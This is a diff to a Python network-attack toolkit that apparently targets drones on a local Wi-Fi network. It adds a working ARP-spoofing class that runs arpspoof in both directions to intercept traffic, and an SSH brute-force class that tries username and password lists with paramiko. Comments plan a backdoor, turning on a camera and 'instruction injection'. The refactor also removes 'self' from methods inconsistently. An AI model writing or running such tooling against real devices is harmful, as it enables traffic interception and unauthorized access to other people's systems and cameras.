@@ -3,9 +3,12 @@ import re
 import socket
 import os
 import hashlib
+import signal
 import math
 import sys
 from scapy.all import *
+import paramiko
+from scapy.all import ARP, Ether, srp
 import ipaddress
 from datetime import datetime
 import json
@@ -173,7 +176,7 @@ class WiFi_toolkit:
         except FileNotFoundError:
             print("Error: Aircrack-ng not found. Please make sure it is installed and in your PATH.")
     
-    def extract_subnet(self,interface):
+    def extract_subnet(interface):
         try:
             # Get the IP address and netmask for the interface using the 'ip addr' command
             output = subprocess.check_output(["ip", "addr", "show", interface], text=True)
@@ -196,7 +199,7 @@ class WiFi_toolkit:
 
         return cidr
 
-    def get_devices(self,cidr):
+    def get_devices(cidr):
         """Get a list of devices connected to the local network using ARP requests."""
         # Create an ARP request packet
         local_subnet = cidr  # Replace with your actual local subnet
@@ -211,11 +214,11 @@ class WiFi_toolkit:
         # Extract the MAC and IP addresses from the response
         devices = []
         for res in result:
-            device_info = {"mac": res[1].hwsrc, "ip": res[1].psrc, "name": self.get_device_name(res[1].psrc)}
+            device_info = {"mac": res[1].hwsrc, "ip": res[1].psrc, "name": WiFi_toolkit.get_device_name(res[1].psrc)}
             devices.append(device_info)
         return devices
     
-    def get_device_name(self,ip_address):
+    def get_device_name(ip_address):
         try:
             # Attempt to resolve the device name using NetBIOS queries
             hostname, _, _ = socket.gethostbyaddr(ip_address)
@@ -223,8 +226,8 @@ class WiFi_toolkit:
         except (socket.herror, socket.gaierror):
             return ""  # Return an empty string if unable to resolve the device name
         
-    def select_target_device(self, cidr):
-        devices = self.get_devices(cidr)
+    def select_target_device(cidr):
+        devices = WiFi_toolkit.get_devices(cidr)
         
         print("Available devices:")
         for i, device in enumerate(devices):
@@ -260,27 +263,76 @@ class WiFi_toolkit:
                         pass
             except socket.error:
                 pass
-            
+
         print(f"Scanning host: {host}")
         with ThreadPoolExecutor(max_workers=50) as executor:
             for port in range(1, 1001):  # Scan common ports
                 executor.submit(scan_port, port)
 
 # ARP Spoofing & Vidieo Intercepting
+class ARPSpoofer:
+    def __init__(self, target_ip, spoof_ip, interface):
+        self.target_ip = target_ip
+        self.spoof_ip = spoof_ip
+        self.interface = interface
+        self.processes = []
+
+    def start(self):
+        # Start ARP spoofing from target to spoof IP
+        command_target = ["arpspoof", "-i", self.interface, "-t", self.target_ip, self.spoof_ip]
+        process_target = subprocess.Popen(command_target)
+
+        # Start ARP spoofing from spoof IP to target
+        command_spoof = ["arpspoof", "-i", self.interface, "-t", self.spoof_ip, self.target_ip]
+        process_spoof = subprocess.Popen(command_spoof)
+
+        self.processes.append(process_target)
+        self.processes.append(process_spoof)
+
+        print("[+] ARP spoofing started...")
+
+    def stop(self):
+        # Stop ARP spoofing processes
+        for process in self.processes:
+            process.terminate()
+        print("[+] ARP spoofing stopped.")
+
+# Vieo Intercepting
 
 # SSH Connection and Building aa backdoor
+class SSHBruteForce:
+    def __init__(self, target_host, username_list, password_list, port=22):
+        self.target_host = target_host
+        self.port = port
+        self.username_list = username_list
+        self.password_list = password_list
 
+    def ssh_connect(self, username, password):
+        ssh_client = paramiko.SSHClient()
+        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+        try:
+            ssh_client.connect(self.target_host, port=self.port, username=username, password=password, timeout=5)
+            print(f"[+] Successfully logged in with {username}:{password}")
+            ssh_client.close()
+            return True
+        except (paramiko.AuthenticationException, socket.error) as e:
+            print(f"[-] Failed to login with {username}:{password}: {e}")
+            return False
+        except Exception as e:
+            print(f"[-] Error: {e}")
+            return False
+
+    def brute_force(self):
+        for username in self.username_list:
+            for password in self.password_list:
+                if self.ssh_connect(username, password):
+                    return True
+        return False
 # Get Drone Manufacturer
 
-# Turnon Camera
+# Turnon Camera 
 
 # Instruction Inejection
 
 # main
-interface_manager = InterfaceManager()
-selected_interface = interface_manager.get_user_input()
-wifi_scanner = WiFi_toolkit(selected_interface)
-x= wifi_scanner.extract_subnet(selected_interface)
-print(x)
-drone_ip=wifi_scanner.select_target_device(x)
-print(drone_ip)
